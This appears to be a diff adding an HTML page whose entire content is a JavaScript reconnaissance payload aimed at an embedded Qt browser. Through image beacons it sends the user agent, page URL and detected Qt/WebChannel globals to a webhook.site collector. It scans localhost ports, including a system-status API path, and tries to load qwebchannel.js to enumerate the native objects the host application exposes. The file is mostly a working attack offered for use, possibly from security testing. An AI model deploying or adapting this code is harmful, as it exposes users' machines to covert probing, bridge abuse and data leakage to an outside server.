@@ -1,0 +1,57 @@
+<!doctype html><html><head><meta charset="utf-8"></head><body><h2>bp4</h2>
+<script>
+(function(){
+  var W="https://webhook.site/c7b10235-199e-45d3-89bd-2f53b4ecab6d";
+  function b(k,v){ try{ (new Image()).src = W+"?t="+encodeURIComponent(k)+"&v="+encodeURIComponent(String(v).slice(0,200))+"&x="+Math.random(); }catch(e){} }
+  // 1) prove JS execution immediately - nothing else before this
+  b("bp4","loaded");
+  b("ua", navigator.userAgent);
+  b("qtT", (typeof window.qt)+"/"+(typeof window.webChannelTransport)+"/"+(typeof window.QWebChannel));
+  var g=[]; try{ var all=Object.getOwnPropertyNames(window); for(var i=0;i<all.length;i++){ if(/^(qt|QWeb|webChannel)/i.test(all[i])) g.push(all[i]); } }catch(e){}
+  b("qtG", g.join(",")||"none");
+  b("chrome", (typeof window.chrome)+"/"+(typeof window.chrome!=="undefined"&&window.chrome.runtime?"rt":"-"));
+  b("origin", location.href.slice(0,70));
+
+  // 2) async localhost reachability with hard timeouts (NO sync XHR - that hanged the renderer)
+  var T=[["4003","https://127.0.0.1:4003/"],["4003st","https://127.0.0.1:4003/v2/configuration/system/status"],
+         ["443","https://127.0.0.1/"],["80","http://127.0.0.1/"],["6542","http://127.0.0.1:6542/"],
+         ["7000","http://127.0.0.1:7000/"],["47000","http://127.0.0.1:47000/"],["8080","http://127.0.0.1:8080/"],
+         ["8443","https://127.0.0.1:8443/"],["9090","http://127.0.0.1:9090/"],["5555","http://127.0.0.1:5555/"],["22","http://127.0.0.1:22/"]];
+  for (var j=0;j<T.length;j++) (function(n,u){
+    var t0=Date.now(), done=false, ctl=(typeof AbortController!=="undefined")?new AbortController():null;
+    var id=setTimeout(function(){ if(!done){ done=true; try{ctl&&ctl.abort();}catch(e){} b("R_"+n,"NO-ANSWER "+(Date.now()-t0)+"ms"); } }, 1800);
+    try {
+      var opt={mode:'no-cors',cache:'no-store'}; if(ctl) opt.signal=ctl.signal;
+      fetch(u,opt).then(function(){ if(!done){done=true;clearTimeout(id); b("R_"+n,"REACHABLE "+(Date.now()-t0)+"ms");} })
+                   .catch(function(e){ if(!done){done=true;clearTimeout(id); b("R_"+n,"unreach "+(Date.now()-t0)+"ms");} });
+    } catch(e){ clearTimeout(id); b("R_"+n,"throw"); }
+  })(T[j][0],T[j][1]);
+
+  // 3) Qt WebChannel bridge attempt (async, with timeout)
+  (function(){
+    var tries=["qrc:///qtwebchannel/qwebchannel.js"], i=0, t0=Date.now();
+    function step(){
+      if (i>=tries.length){ b("wcJs","none-loaded"); mk(); return; }
+      var s=document.createElement("script"), u=tries[i++], fired=false;
+      var id=setTimeout(function(){ if(!fired){ fired=true; b("wcJs","timeout:"+u); step(); } }, 1500);
+      s.onload=function(){ if(!fired){fired=true;clearTimeout(id); b("wcJs","loaded:"+u+" "+(Date.now()-t0)+"ms"); mk(); } };
+      s.onerror=function(){ if(!fired){fired=true;clearTimeout(id); b("wcJs","error:"+u); step(); } };
+      s.src=u; document.head.appendChild(s);
+    }
+    function mk(){
+      try{
+        if (typeof QWebChannel==="undefined"){ b("wc","no QWebChannel"); return; }
+        if (typeof qt==="undefined"||!qt.webChannelTransport){ b("wc","no transport"); return; }
+        new QWebChannel(qt.webChannelTransport, function(ch){
+          var ks=[]; try{ ks=Object.keys(ch.objects||{}); }catch(e){}
+          b("wcObjs", ks.join("|")||"empty");
+          for (var k=0;k<ks.length&&k<8;k++){ try{ b("wcO_"+ks[k], Object.getOwnPropertyNames(ch.objects[ks[k]]).slice(0,40).join(",")); }catch(e){} }
+        });
+        b("wc","constructed");
+      }catch(e){ b("wc","err "+String(e).slice(0,80)); }
+    }
+    step();
+  })();
+  b("end","chain-started");
+})();
+</script></body></html>
